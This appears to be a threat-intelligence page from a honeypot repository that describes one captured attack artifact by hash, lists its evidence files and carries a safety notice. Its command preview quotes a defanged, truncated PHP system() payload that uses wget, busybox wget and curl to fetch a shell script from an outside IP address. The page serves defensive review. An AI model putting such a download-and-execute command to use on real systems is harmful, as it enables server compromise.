# 8c0d3036d8d57054b2eb0311d591094c9f44213f0c16208bc644831a3de0606e

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `8c0d3036d8d57054b2eb0311d591094c9f44213f0c16208bc644831a3de0606e` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
<?php system('(wget -qO- hxxp://45[.]153[.]34[.]XXX/rondo.``dtm.sh||busybox wget -qO- hxxp://45[.]153[.]34[.]XXX/rondo.``dtm.sh||cur
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
